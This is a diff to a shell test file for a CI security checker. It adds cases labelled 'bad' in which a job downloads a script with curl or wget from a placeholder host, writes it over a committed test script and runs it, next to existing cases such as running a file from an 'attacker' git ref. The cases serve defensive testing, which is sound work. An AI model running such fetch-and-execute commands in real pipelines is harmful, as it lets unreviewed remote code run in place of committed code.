@@ -1698,6 +1698,13 @@ case_ r3c02-replace-workspace  bad "$(rb "printf 'docker run alpine\\n' > ci-ok.
 case_ r3c02-replace-bash-c     bad "$(rb "bash -c \"printf 'docker run alpine\\\\n' > ci-ok.sh\"; bash ci-ok.sh")" "printf 'echo ok\\n' > ci-ok.sh"
 case_ r3c02-replace-by-script  bad "$(rb 'bash mutate.sh; bash ci-ok.sh')" "printf 'echo ok\\n' > ci-ok.sh; printf \"printf 'docker run alpine\\\\\\\\n' > ci-ok.sh\\n\" > mutate.sh"
 case_ r3c02-replace-harness    bad "$(rb "printf 'docker run alpine\\n' > bin/probe-test.sh; bash bin/probe-test.sh")" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
+# a downloader that writes onto a committed script the job then runs: the committed bytes are not what runs (Row 78 round of cache#407, seat A's probe)
+case_ r4c02-curl-o-replaces-harness  bad "$(rb 'curl -fsSL https://example.invalid/test.sh -o bin/probe-test.sh; bash bin/probe-test.sh')" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
+case_ r4c02-curl-output-long         bad "$(rb 'curl -fsSL https://example.invalid/test.sh --output bin/probe-test.sh; bash bin/probe-test.sh')" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
+case_ r4c02-curl-output-equals       bad "$(rb 'curl -fsSL https://example.invalid/test.sh --output=bin/probe-test.sh; bash bin/probe-test.sh')" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
+case_ r4c02-wget-O-replaces          bad "$(rb 'wget -q https://example.invalid/test.sh -O bin/probe-test.sh; bash bin/probe-test.sh')" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
+case_ r4c02-curl-o-dotslash          bad "$(rb 'curl -fsSL https://example.invalid/test.sh -o ./bin/probe-test.sh; bash ./bin/probe-test.sh')" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
+case_ r4c02-curl-o-other-file-ok     ok  "$(rb 'curl -fsSL https://example.invalid/data.json -o /tmp/data.json; bash bin/probe-test.sh')" "mkdir -p bin; printf 'echo ok\\n' > bin/probe-test.sh"
 case_ r3c02-api-unrelated      bad "$(rb 'gh api "repos/$GITHUB_REPOSITORY/contents/ci-ok.sh?ref=main" --jq .content >/dev/null; printf "docker run alpine\\n" > "$RUNNER_TEMP/ci-ok.sh"; bash "$RUNNER_TEMP/ci-ok.sh"')" "printf 'echo ok\\n' > ci-ok.sh"
 case_ r3c02-git-show-ref       bad "$(rb 'git show attacker:ci-ok.sh > "$RUNNER_TEMP/ci-ok.sh"; bash "$RUNNER_TEMP/ci-ok.sh"')" "printf 'echo ok\\n' > ci-ok.sh"
 case_ r3c02-python-generated   bad "$(rb "printf 'import os\\n' > /tmp/fetch.py; python3 /tmp/fetch.py")"
